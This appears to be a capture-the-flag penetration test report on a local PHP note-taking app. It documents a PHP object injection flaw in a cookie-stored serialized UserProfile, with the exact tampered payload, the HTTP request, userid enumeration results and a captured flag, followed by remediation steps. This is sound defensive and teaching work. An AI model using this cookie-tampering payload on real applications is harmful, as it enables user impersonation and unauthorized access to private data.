## TL;DR
- Objective: Locate and extract a secret note flag from a PHP note-taking application
- Outcome: ACHIEVED - Secret note accessed via PHP Object Injection
- Highest-impact finding: Insecure deserialization of untrusted cookie data leading to complete user context manipulation
- Validation status: **FLAG CAPTURED** - `FLAG{a68e6443c894f67f53c4db8f932273d21468c7acd52ee8e8a78357e88f3bccc5}`

## Target Information
- Target: 127.0.0.1:32984
- Host / base URL: http://127.0.0.1:32984
- Application or component: PHP Note-Taking System
- Authentication context: Authenticated as `deadendtester` (userid=6)
- Relevant technology details: PHP application using serialized objects stored in cookies

## Confirmed Vulnerability
### Insecure Deserialization / PHP Object Injection
- Affected endpoint / component: All endpoints processing the `data` cookie
- Impact: Complete authentication bypass; ability to impersonate any user and access their notes
- Preconditions: Valid authenticated session (to obtain cookie structure), knowledge of serialized object format
- Exact payload or PoC:
  ```
  O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:13:"deadendtester";}
  ```

### IDOR via Object Injection
- Affected endpoint / component: `/notes` or equivalent note viewing endpoint
- Impact: Unauthorized access to other users' notes including secret flag
- Preconditions: Same as above
- Exact payload or PoC: Same serialized object with modified `userid` parameter

## Steps to Reproduce
1. **Authenticate** to the application as any valid user (e.g., `deadendtester`)
2. **Capture** the `data` cookie containing the serialized UserProfile object:
   ```
   data=O:11:"UserProfile":2:{s:6:"userid";i:6;s:8:"username";s:13:"deadendtester";}
   ```
3. **Modify** the serialized object to target a different userid (e.g., userid=1):
   ```
   O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:13:"deadendtester";}
   ```
4. **Send** HTTP request with modified cookie:
   ```
   GET /notes HTTP/1.1
   Host: 127.0.0.1:32984
   Cookie: data=O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:13:"deadendtester";}
   ```
5. **Observe** the response contains notes belonging to userid=1, including the secret flag

## Validation / Evidence
- Validation token / flag: `FLAG{a68e6443c894f67f53c4db8f932273d21468c7acd52ee8e8a78357e88f3bccc5}`
- Tool evidence: Enumeration of userid values 1-25 via automated PHP Object Injection payload generation
- Request evidence: Modified `data` cookie with serialized UserProfile object containing `userid=1`
- Response evidence:
  ```html
  <td><h3>Flag</h3></td></tr><tr><td><p>My Secret Flag FLAG{a68e6443c894f67f53c4db8f932273d21468c7acd52ee8e8a78357e88f3bccc5}</p></td></tr>
  ```
- Notes on reliability / limitations: Fully reliable. No signature validation or integrity checks on serialized cookie data.

### Enumeration Results
| User ID | Response Size | Notes |
|---------|---------------|-------|
| 1 | 2528 bytes | **SECRET NOTE OWNER** - Contains FLAG |
| 2-5 | Error 404 | Non-existent users |
| 6 | 1541 bytes | Current authenticated user (baseline) |
| 15 | 2476 bytes | Different user with notes |
| 22 | 2478 bytes | Different user with notes |
| 7-14, 16-21, 23-25 | 1541 bytes | Users with same note count as baseline |

## Remediation
- Root cause: The application deserializes untrusted user-controlled data (cookie values) without validation, integrity checks, or authentication verification after deserialization. The `userid` parameter is taken directly from the deserialized object without server-side authorization checks.

- Recommended fix:
  1. **Do not store serialized objects in cookies** - Use JSON or simple key-value pairs instead
  2. **Implement server-side session management** - Store user identifiers server-side (e.g., in a database or cache) with a cryptographically secure random session token
  3. **Add cryptographic signatures** - If serialized data must be stored client-side, sign it with HMAC-SHA256 and validate before deserialization
  4. **Validate deserialized data** - Re-authenticate or verify the deserialized userid against the session store before granting access
  5. **Use `allowed_classes` parameter** in PHP's `unserialize()` to restrict deserialization to specific safe classes

- Defense-in-depth:
  1. Implement strict Content Security Policy headers
  2. Add rate limiting on note access endpoints
  3. Log and alert on anomalous access patterns (e.g., rapid userid enumeration)
  4. Consider using PHP's `igbinary` or `msgpack` with additional validation layers

## How to Verify the Fix
1. **Attempt original exploit**: Send the working payload with modified userid=1:
   ```
   Cookie: data=O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:13:"deadendtester";}
   ```
2. **Expected secure result**: 
   - The server should reject the modified cookie OR
   - The server should return notes belonging to the authenticated user (userid=6), NOT userid=1 OR
   - The server returns an authentication error (401/403)
3. **Confirm flag inaccessibility**: Verify that userid=1's notes (including the secret flag) cannot be accessed by other users

## Remaining Leads
- Confirmed blockers: None
- Unverified leads: None - objective fully achieved
- Missing context: None - complete exploitation chain documented
